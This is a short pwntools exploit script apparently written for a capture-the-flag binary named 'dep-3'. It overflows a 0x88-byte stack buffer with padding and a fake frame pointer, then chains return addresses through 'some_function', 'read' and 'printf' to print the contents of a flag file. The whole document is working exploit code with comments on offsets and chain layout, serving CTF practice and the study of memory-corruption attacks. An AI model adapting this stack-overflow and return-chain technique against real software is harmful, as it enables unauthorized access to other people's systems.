from pwn import *

# Requires a symlink from a.txt to flag
# Doesn't give shell, but prints flag to stdout

# GDB says buffer starts at ebp - 0x88
# Function addresses come from GDB
# [0x88 bytes][garbage ebp][1stretaddr(some_function)][2ndretaddr(read)]
# [3rdretaddr(printf)][ARG1read][Arg1printf/arg2read][arg3read]

addr_somefunction = ELF('./dep-3').symbols['some_function']
addr_read = 0x0806d2a0
addr_printf = 0x0804ede0

p = process("./dep-3")
inp = "a" * 0x88 + "bbbb" + p32(addr_somefunction) + p32(addr_read) + p32(addr_printf) + p32(0x00000003) + p32(0xffffd100) + p32(00000100)
p.send(inp)
p.interactive()
quit()
